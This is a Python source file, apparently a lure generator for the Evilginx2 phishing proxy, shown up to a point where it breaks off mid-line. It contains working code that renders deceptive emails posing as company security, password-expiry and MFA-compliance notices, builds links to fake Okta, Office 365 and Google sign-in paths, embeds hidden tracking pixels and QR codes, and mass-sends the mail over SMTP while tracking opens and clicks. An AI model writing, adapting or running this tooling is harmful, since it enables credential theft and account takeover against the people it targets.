#!/usr/bin/env python3

"""
Automated Lure Generation System for Evilginx2 v3.4.1
Generate and distribute phishing lures (links, emails) at scale
"""

import os
import re
import json
import smtplib
import random
import string
import argparse
import logging
from datetime import datetime, timedelta
from pathlib import Path
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from urllib.parse import urlencode
import configparser
from typing import List, Dict, Any, Optional
import jinja2
import qrcode
import base64
from io import BytesIO

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/lure_generator.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class LureGenerator:
    """Main lure generation class"""
    
    def __init__(self, config_file: str = "config.conf"):
        self.config = self.load_config(config_file)
        self.templates_dir = Path("templates/lures")
        self.output_dir = Path("lures/generated")
        self.tracking_db = Path("logs/lure_tracking.json")
        
        # Create directories
        for directory in [self.templates_dir, self.output_dir]:
            directory.mkdir(parents=True, exist_ok=True)
            
        # Initialize templates
        self.jinja_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(str(self.templates_dir)),
            autoescape=jinja2.select_autoescape(['html', 'xml'])
        )
        
        # Load tracking data
        self.tracking_data = self.load_tracking_data()
        
    def load_config(self, config_file: str) -> configparser.ConfigParser:
        """Load configuration from file"""
        config = configparser.ConfigParser()
        if os.path.exists(config_file):
            config.read(config_file)
        return config
        
    def load_tracking_data(self) -> Dict[str, Any]:
        """Load lure tracking data"""
        if self.tracking_db.exists():
            try:
                with open(self.tracking_db, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Error loading tracking data: {e}")
                
        return {
            'campaigns': {},
            'lures': {},
            'stats': {
                'total_sent': 0,
                'total_clicked': 0,
                'total_opened': 0
            }
        }
        
    def save_tracking_data(self):
        """Save lure tracking data"""
        try:
            with open(self.tracking_db, 'w') as f:
                json.dump(self.tracking_data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Error saving tracking data: {e}")
            
    def generate_lure_id(self) -> str:
        """Generate unique lure ID"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
    def generate_tracking_pixel(self, lure_id: str) -> str:
        """Generate tracking pixel HTML"""
        tracking_url = f"https://{self.config.get('DEFAULT', 'PHISHING_DOMAIN', fallback='example.com')}/track/{lure_id}.gif"
        return f'<img src="{tracking_url}" width="1" height="1" style="display:none;" />'
        
    def generate_phishing_link(self, phishlet: str, lure_id: str, custom_params: Dict[str, str] = None) -> str:
        """Generate phishing link with tracking"""
        base_domain = self.config.get('DEFAULT', 'PHISHING_DOMAIN', fallback='example.com')
        
        # Build URL parameters
        params = {
            'lid': lure_id,
            'src': 'email'
        }
        
        if custom_params:
            params.update(custom_params)
            
        # Generate URL
        if phishlet == 'okta':
            path = '/auth/login'
        elif phishlet == 'office365':
            path = '/login.microsoftonline.com'
        elif phishlet == 'gmail':
            path = '/accounts.google.com/signin'
        else:
            path = '/'
            
        query_string = urlencode(params)
        return f"https://{base_domain}{path}?{query_string}"
        
    def generate_qr_code(self, url: str) -> str:
        """Generate QR code for URL and return as base64"""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_base64 = base64.b64encode(buffered.getvalue()).decode()
        
        return f"data:image/png;base64,{img_base64}"
        
    def create_email_templates(self):
        """Create default email templates"""
        templates = {
            'security_alert': {
                'subject': '🚨 Security Alert: Suspicious Login Detected',
                'template': '''
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background-color: #d73502; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .alert-box { background-color: #fff3cd; border: 1px solid #ffeeba; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .button { background-color: #007bff; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; }
        .footer { font-size: 12px; color: #666; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ {{ company_name }} Security Team</h1>
    </div>
    
    <div class="content">
        <p>Hello {{ first_name }},</p>
        
        <div class="alert-box">
            <strong>⚠️ URGENT SECURITY ALERT</strong><br>
            We detected a suspicious login attempt on your account from an unrecognized device.
        </div>
        
        <p><strong>Details:</strong></p>
        <ul>
            <li><strong>Time:</strong> {{ timestamp }}</li>
            <li><strong>Location:</strong> {{ location }}</li>
            <li><strong>Device:</strong> {{ device }}</li>
            <li><strong>IP Address:</strong> {{ ip_address }}</li>
        </ul>
        
        <p>If this was you, please disregard this message. However, if you did not attempt to sign in, your account may be compromised.</p>
        
        <p><strong>IMMEDIATE ACTION REQUIRED:</strong></p>
        <p>Please verify your account security by clicking the button below:</p>
        
        <a href="{{ phishing_link }}" class="button">🔒 Secure My Account Now</a>
        
        <p>For your security, this link will expire in 24 hours.</p>
        
        <div class="footer">
            <p>This is an automated security alert from {{ company_name }}.<br>
            If you have any questions, please contact our security team immediately.</p>
            <p>&copy; {{ current_year }} {{ company_name }}. All rights reserved.</p>
        </div>
    </div>
    {{ tracking_pixel }}
</body>
</html>
                '''
            },
            'password_expiry': {
                'subject': '⚠️ Your password expires in 24 hours - Action Required',
                'template': '''
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background-color: #17a2b8; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .warning-box { background-color: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .button { background-color: #28a745; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; }
        .countdown { font-size: 24px; color: #dc3545; font-weight: bold; text-align: center; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔐 {{ company_name }} IT Security</h1>
    </div>
    
    <div class="content">
        <p>Dear {{ first_name }} {{ last_name }},</p>
        
        <div class="warning-box">
            <strong>⏰ PASSWORD EXPIRATION NOTICE</strong><br>
            Your {{ company_name }} account password will expire in less than 24 hours.
        </div>
        
        <div class="countdown">
            ⏰ Time Remaining: {{ hours_remaining }} hours
        </div>
        
        <p>To avoid account lockout and service interruption, you must update your password immediately.</p>
        
        <p><strong>What happens if you don't update:</strong></p>
        <ul>
            <li>❌ Loss of access to all company systems</li>
            <li>❌ Email and calendar will be disabled</li>
            <li>❌ VPN access will be revoked</li>
            <li>❌ Manual IT ticket required for restoration</li>
        </ul>
        
        <p><strong>Update your password now to maintain access:</strong></p>
        
        <a href="{{ phishing_link }}" class="button">🔑 Update Password Now</a>
        
        <p><em>This secure link is valid for {{ first_name }} {{ last_name }} only and expires at {{ expiry_time }}.</em></p>
        
        <p>Thank you for keeping our systems secure.</p>
        
        <p>Best regards,<br>
        {{ company_name }} IT Security Team</p>
    </div>
    {{ tracking_pixel }}
</body>
</html>
                '''
            },
            'mfa_setup': {
                'subject': '🔐 Multi-Factor Authentication Setup Required - Compliance Mandate',
                'template': '''
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background-color: #6f42c1; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .compliance-box { background-color: #e7f3ff; border: 1px solid #b6d7ff; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .button { background-color: #6f42c1; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0; }
        .qr-code { text-align: center; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ {{ company_name }} Compliance Team</h1>
    </div>
    
    <div class="content">
        <p>Hello {{ first_name }},</p>
        
        <div class="compliance-box">
            <strong>📋 COMPLIANCE REQUIREMENT</strong><br>
            As part of our new security policy, all employees must enable Multi-Factor Authentication (MFA) by {{ deadline_date }}.
        </div>
        
        <p>This security enhancement is mandatory for:</p>
        <ul>
            <li>✅ SOX compliance requirements</li>
            <li>✅ GDPR data protection</li>
            <li>✅ Insurance policy compliance</li>
            <li>✅ Client security agreements</li>
        </ul>
        
        <p><strong>Setup is quick and easy:</strong></p>
        <ol>
            <li>Click the secure setup link below</li>
            <li>Scan the QR code with your phone</li>
            <li>Enter the verification code</li>
            <li>You're protected!</li>
        </ol>
        
        <a href="{{ phishing_link }}" class="button">🔐 Setup MFA Now</a>
        
        <div class="qr-code">
            <p><strong>Or scan this QR code with your mobile device:</strong></p>
            <img src="{{ qr_code }}" alt="MFA Setup QR Code" />
        </div>
        
        <p><strong>Important:</strong> Accounts without MFA will be automatically suspended after {{ deadline_date }} for security compliance.</p>
        
        <p>Questions? Contact IT Security at security@{{ company_domain }}</p>
        
        <p>Thank you for your cooperation,<br>
        {{ company_name }} Compliance Team</p>
    </div>
    {{ tracking_pixel }}
</body>
</html>
                '''
            }
        }
        
        # Save templates to files
        for template_name, template_data in templates.items():
            template_file = self.templates_dir / f"{template_name}.html"
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(template_data['template'])
                
            # Save subject separately
            subject_file = self.templates_dir / f"{template_name}_subject.txt"
            with open(subject_file, 'w', encoding='utf-8') as f:
                f.write(template_data['subject'])
                
        logger.info(f"Created {len(templates)} email templates")
        
    def generate_lure_context(self, target: Dict[str, str], template_type: str) -> Dict[str, Any]:
        """Generate context variables for lure template"""
        lure_id = self.generate_lure_id()
        
        # Base context
        context = {
            'lure_id': lure_id,
            'first_name': target.get('first_name', 'User'),
            'last_name': target.get('last_name', 'Name'),
            'email': target.get('email', 'user@example.com'),
            'company_name': target.get('company', 'Your Company'),
            'company_domain': target.get('company_domain', 'example.com'),
            'current_year': datetime.now().year,
            'timestamp': datetime.now().strftime('%B %d, %Y at %I:%M %p'),
            'phishing_link': self.generate_phishing_link('okta', lure_id),
            'tracking_pixel': self.generate_tracking_pixel(lure_id)
        }
        
        # Template-specific context
        if template_type == 'security_alert':
            context.update({
                'location': random.choice(['New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX']),
                'device': random.choice(['iPhone 12', 'Samsung Galaxy S21', 'Windows PC', 'MacBook Pro']),
                'ip_address': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            })
            
        elif template_type == 'password_expiry':
            hours_remaining = random.randint(2, 23)
            expiry_time = (datetime.now() + timedelta(hours=hours_remaining)).strftime('%B %d, %Y at %I:%M %p')
            context.update({
                'hours_remaining': hours_remaining,
                'expiry_time': expiry_time
            })
            
        elif template_type == 'mfa_setup':
            deadline = datetime.now() + timedelta(days=7)
            context.update({
                'deadline_date': deadline.strftime('%B %d, %Y'),
                'qr_code': self.generate_qr_code(context['phishing_link'])
            })
            
        return context
        
    def generate_single_lure(self, target: Dict[str, str], template_type: str) -> Dict[str, Any]:
        """Generate a single lure for a target"""
        try:
            # Generate context
            context = self.generate_lure_context(target, template_type)
            
            # Load and render template
            template = self.jinja_env.get_template(f"{template_type}.html")
            html_content = template.render(**context)
            
            # Load subject template
            subject_file = self.templates_dir / f"{template_type}_subject.txt"
            if subject_file.exists():
                with open(subject_file, 'r') as f:
                    subject_template = jinja2.Template(f.read())
                    subject = subject_template.render(**context)
            else:
                subject = f"Important Security Notice - Action Required"
                
            # Save generated lure
            lure_file = self.output_dir / f"lure_{context['lure_id']}.html"
            with open(lure_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
                
            # Track lure
            lure_data = {
                'id': context['lure_id'],
                'target': target,
                'template': template_type,
                'subject': subject,
                'html_file': str(lure_file),
                'phishing_link': context['phishing_link'],
                'created': datetime.now().isoformat(),
                'status': 'generated',
                'opened': False,
                'clicked': False
            }
            
            self.tracking_data['lures'][context['lure_id']] = lure_data
            
            return {
                'lure_id': context['lure_id'],
                'subject': subject,
                'html_content': html_content,
                'phishing_link': context['phishing_link'],
                'target': target,
                'file': str(lure_file)
            }
            
        except Exception as e:
            logger.error(f"Error generating lure for {target.get('email', 'unknown')}: {e}")
            return None
            
    def generate_campaign_lures(self, targets: List[Dict[str, str]], template_type: str, campaign_name: str) -> Dict[str, Any]:
        """Generate lures for an entire campaign"""
        campaign_id = f"campaign_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        campaign_data = {
            'id': campaign_id,
            'name': campaign_name,
            'template': template_type,
            'created': datetime.now().isoformat(),
            'targets': len(targets),
            'lures': [],
            'stats': {
                'generated': 0,
                'sent': 0,
                'opened': 0,
                'clicked': 0
            }
        }
        
        generated_lures = []
        
        for target in targets:
            lure = self.generate_single_lure(target, template_type)
            if lure:
                generated_lures.append(lure)
                campaign_data['lures'].append(lure['lure_id'])
                campaign_data['stats']['generated'] += 1
                
        # Save campaign data
        self.tracking_data['campaigns'][campaign_id] = campaign_data
        self.save_tracking_data()
        
        logger.info(f"Generated {len(generated_lures)} lures for campaign '{campaign_name}'")
        
        return {
            'campaign_id': campaign_id,
            'campaign_name': campaign_name,
            'lures': generated_lures,
            'stats': campaign_data['stats']
        }
        
    def send_email_lure(self, lure: Dict[str, Any], smtp_config: Dict[str, str] = None) -> bool:
        """Send email lure to target"""
        try:
            # Use provided config or load from main config
            if not smtp_config:
                smtp_config = {
                    'server': self.config.get('EMAIL', 'SMTP_SERVER', fallback='smtp.gmail.com'),
                    'port': self.config.getint('EMAIL', 'SMTP_PORT', fallback=587),
                    'username': self.config.get('EMAIL', 'SMTP_USER', fallback=''),
                    'password': self.config.get('EMAIL', 'SMTP_PASS', fallback=''),
                    'from_email': self.config.get('EMAIL', 'FROM_EMAIL', fallback='noreply@example.com'),
                    'from_name': self.config.get('EMAIL', 'FROM_NAME', fallback='IT Security Team')
                }
                
            # Create message
            msg = MIMEMultipart('alternative')
            msg['Subject'] = lure['subject']
            msg['From'] = f"{smtp_config['from_name']} <{smtp_config['from_email']}>"
            msg['To'] = lure['target']['email']
            msg['Reply-To'] = smtp_config['from_email']
            
            # Add HTML content
            html_part = MIMEText(lure['html_content'], 'html')
            msg.attach(html_part)
            
            # Send email
            with smtplib.SMTP(smtp_config['server'], smtp_config['port']) as server:
                server.starttls()
                server.login(smtp_config['username'], smtp_config['password'])
                server.send_message(msg)
                
            # Update tracking
            if lure['lure_id'] in self.tracking_data['lures']:
                self.tracking_data['lures'][lure['lure_id']]['status'] = 'sent'
                self.tracking_data['lures'][lure['lure_id']]['sent_time'] = datetime.now().isoformat()
                
            self.tracking_data['stats']['total_sent'] += 1
            self.save_tracking_data()
            
            logger.info(f"Sent lure {lure['lure_id']} to {lure['target']['email']}")
            return True
            
        except Exception as e:
            logger.error(f"Error sending lure {lure['lure_id']}: {e}")
            return False
            
    def send_campaign_emails(self, campaign_id: str, delay_seconds: int = 30) -> Dict[str, Any]:
        """Send all emails for a campaign with delays"""
        import time
        
        if campaign_id not in self.tracking_data['campaigns']:
            logger.error(f"Campaign not found: {campaign_id}")
            return None
            
        campaign = self.tracking_data['campaigns'][campaign_id]
        results = {
            'campaign_id': campaign_id,
            'total_lures': len(campaign['lures']),
            'sent': 0,
            'failed': 0,
            'errors': []
        }
        
        for lure_id in campaign['lures']:
            if lure_id in self.tracking_data['lures']:
                lure_data = self.tracking_data['lures'][lure_id]
                
                # Reconstruct lure object
                lure = {
                    'lure_id': lure_id,
                    'subject': lure_data['subject'],
                    'html_content': self.load_lure_html(lure_data['html_file']),
                    'target': lure_data['target'],
                    'phishing_link': lure_data['phishing_link']
                }
                
                if self.send_email_lure(lure):
                    results['sent'] += 1
                    campaign['stats']['sent'] += 1
                else:
                    results['failed'] += 1
                    results['errors'].append(f"Failed to send to {lure_data['target']['email']}")
                    
                # Delay between sends to avoid rate limiting
                if delay_seconds > 0:
                    time.sleep(delay_seconds)
                    
        self.save_tracking_data()
        logger.info(f"Campaign {campaign_id} completed: {results['sent']} sent, {results['failed']} failed")
        
        return results
        
    def load_lure_html(self, html_file: str) -> str:
        """Load HTML content from file"""
        try:
            with open(html_file, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            logger.error(f"Error loading HTML file {html_file}: {e}")
            return ""
            
    def track_lure_action(self, lure_id: str, action: str) -> bool:
        """Track lure actions (opened, clicked)"""
        if lure_id in self.tracking_data['lures']:
            lure = self.tracking_data['lures'][lure_id]
            
            if action == 'opened' and not lure['opened']:
                lure['opened'] = True
                lure['opened_time'] = datetime.now().isoformat()
                self.tracking_data['stats']['total_opened'] += 1
                
            elif action == 'clicked' and not lure['clicked']:
                lure['clicked'] = True
                lure['clicked_time'] = datetime.now().isoformat()
                self.tracking_data['stats']['total_clicked'] += 1
                
            self.save_tracking_data()
            logger.info(f"Tracked {action} for lure {lure_id}")
            return True
            
        return False
        
    def get_campaign_stats(self, campaign_id: str = None) -> Dict[str, Any]:
        """Get campaign statistics"""
        if campaign_id:
            if campaign_id in self.tracking_data['campaigns']:
                campaign = self.tracking_data['campaigns'][campaign_id]
                
                # Calculate current stats
                opened = sum(1 for lure_id in campaign['lures'] 
                           if self.tracking_data['lures'].get(lure_id, {}).get('opened', False))
                clicked = sum(1 for lure_id in campaign['lures'] 
                            if self.tracking_data['lures'].get(lure_id, {}).get('clicked', False))
                
                campaign['stats']['opened'] = opened
                campaign['stats']['clicked'] = clicked
                
                return campaign
            else:
                return None
        else:
            # Return overall stats
            return self.tracking_data['stats']
            
    def generate_report(self, campaign_id: str = None) -> str:
        """Generate lure campaign report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if campaign_id:
            report_file = f"reports/lure_campaign_{campaign_id}_{timestamp}.txt"
            campaign = self.get_campaign_stats(campaign_id)
            
            if not campaign:
                logger.error(f"Campaign not found: {campaign_id}")
                return ""
                
        else:
            report_file = f"reports/lure_overall_{timestamp}.txt"
            
        os.makedirs("reports", exist_ok=True)
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=== Evilginx2 Lure Generation Report ===\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            if campaign_id:
                f.write(f"Campaign: {campaign['name']} ({campaign['id']})\n")
                f.write(f"Template: {campaign['template']}\n")
                f.write(f"Created: {campaign['created']}\n\n")
                
                f.write("=== Campaign Statistics ===\n")
                f.write(f"Total Targets: {campaign['targets']}\n")
                f.write(f"Lures Generated: {campaign['stats']['generated']}\n")
                f.write(f"Emails Sent: {campaign['stats']['sent']}\n")
                f.write(f"Emails Opened: {campaign['stats']['opened']}\n")
                f.write(f"Links Clicked: {campaign['stats']['clicked']}\n\n")
                
                if campaign['stats']['sent'] > 0:
                    open_rate = (campaign['stats']['opened'] / campaign['stats']['sent']) * 100
                    click_rate = (campaign['stats']['clicked'] / campaign['stats']['sent']) * 100
                    f.write(f"Open Rate: {open_rate:.1f}%\n")
                    f.write(f"Click Rate: {click_rate:.1f}%\n\n")
                    
                f.write("=== Individual Lure Results ===\n")
                for lure_id in campaign['lures']:
                    if lure_id in self.tracking_data['lures']:
                        lure = self.tracking_data['lures'][lure_id]
                        f.write(f"\nLure: {lure_id}\n")
                        f.write(f"Target: {lure['target']['email']}\n")
                        f.write(f"Status: {lure['status']}\n")
                        f.write(f"Opened: {'Yes' if lure['opened'] else 'No'}\n")
                        f.write(f"Clicked: {'Yes' if lure['clicked'] else 'No'}\n")
                        
            else:
                f.write("=== Overall Statistics ===\n")
                stats = self.tracking_data['stats']
                f.write(f"Total
